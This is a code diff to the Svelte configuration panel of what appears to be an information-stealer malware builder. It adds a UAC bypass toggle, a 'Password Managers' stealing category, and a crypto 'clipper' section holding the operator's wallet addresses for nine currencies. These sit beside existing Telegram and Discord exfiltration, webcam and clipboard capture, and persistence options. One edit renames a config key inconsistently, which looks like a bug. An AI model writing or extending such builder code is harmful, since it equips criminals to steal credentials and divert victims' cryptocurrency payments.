@@ -18,6 +18,7 @@
   import FeatureSection from "./components/FeatureSection.svelte";
   import GeoBlockSection from "./components/GeoBlockSection.svelte";
   import PumperSection from "./components/PumperSection.svelte";
+  import ClipperSection from "./components/ClipperSection.svelte";
   import FileGrabberSection from "./components/FileGrabberSection.svelte";
   import PasswordGeneratorDialog from "./components/PasswordGeneratorDialog.svelte";
   import {
@@ -42,7 +43,7 @@
     { id: "VPNs", label: "VPNs" },
     { id: "Wallets", label: "Wallets" },
     { id: "System", label: "System" },
-    { id: "Other", label: "Other" },
+    { id: "Other", label: "Password Managers" },
   ] as const;
 
   const iconPresets = [
@@ -97,6 +98,17 @@
   let captureWebcams = $state(false);
   let captureClipboard = $state(false);
   let persistence = $state(false);
+  let uacBypass = $state(false);
+  let clipper = $state(false);
+  let btcAddress = $state("");
+  let ethAddress = $state("");
+  let ltcAddress = $state("");
+  let xmrAddress = $state("");
+  let dogeAddress = $state("");
+  let dashAddress = $state("");
+  let solAddress = $state("");
+  let trxAddress = $state("");
+  let adaAddress = $state("");
   let blockedCountries = $state<string[]>([]);
   let pumpSize = $state(0);
   let pumpUnit = $state<"kb" | "mb" | "gb">("mb");
@@ -177,6 +189,24 @@
   const togglePersistence = () => {
     persistence = !persistence;
   };
+
+  const toggleUacBypass = () => {
+    uacBypass = !uacBypass;
+  };
+
+  const toggleClipper = () => {
+    clipper = !clipper;
+  };
+
+  const handleBtcChange = (val: string) => (btcAddress = val);
+  const handleEthChange = (val: string) => (ethAddress = val);
+  const handleLtcChange = (val: string) => (ltcAddress = val);
+  const handleXmrChange = (val: string) => (xmrAddress = val);
+  const handleDogeChange = (val: string) => (dogeAddress = val);
+  const handleDashChange = (val: string) => (dashAddress = val);
+  const handleSolChange = (val: string) => (solAddress = val);
+  const handleTrxChange = (val: string) => (trxAddress = val);
+  const handleAdaChange = (val: string) => (adaAddress = val);
 
   const toggleCountry = (code: string) => {
     if (blockedCountries.includes(code)) {
@@ -332,9 +362,20 @@
                 telegram_chat_id: telegramChatId,
                 discord_webhook: discordWebhook,
                 capture_screenshots: captureScreenshots,
-                capture_webcams: captureWebcams,
+                capturewebcams: captureWebcams,
                 capture_clipboard: captureClipboard,
                 persistence: persistence,
+                uac_bypass: uacBypass,
+                clipper: clipper,
+                btc_address: btcAddress,
+                eth_address: ethAddress,
+                ltc_address: ltcAddress,
+                xmr_address: xmrAddress,
+                doge_address: dogeAddress,
+                dash_address: dashAddress,
+                sol_address: solAddress,
+                trx_address: trxAddress,
+                ada_address: adaAddress,
                 blocked_countries: blockedCountries,
                 pump_size_mb: pumpSizeMb,
                 custom_extensions: customExtensions,
@@ -404,11 +445,38 @@
       captureWebcams={captureWebcams}
       captureClipboard={captureClipboard}
       persistence={persistence}
+      uacBypass={uacBypass}
+      clipper={clipper}
       onToggleScreenshots={toggleScreenshots}
       onToggleWebcams={toggleWebcams}
       onToggleClipboard={toggleClipboard}
       onTogglePersistence={togglePersistence}
+      onToggleUacBypass={toggleUacBypass}
+      onToggleClipper={toggleClipper}
     />
+
+    {#if clipper}
+      <ClipperSection
+        {btcAddress}
+        {ethAddress}
+        {ltcAddress}
+        {xmrAddress}
+        {dogeAddress}
+        {dashAddress}
+        {solAddress}
+        {trxAddress}
+        {adaAddress}
+        onBtcChange={handleBtcChange}
+        onEthChange={handleEthChange}
+        onLtcChange={handleLtcChange}
+        onXmrChange={handleXmrChange}
+        onDogeChange={handleDogeChange}
+        onDashChange={handleDashChange}
+        onSolChange={handleSolChange}
+        onTrxChange={handleTrxChange}
+        onAdaChange={handleAdaChange}
+      />
+    {/if}
 
     <CommunicationSection
       commMode={commMode}
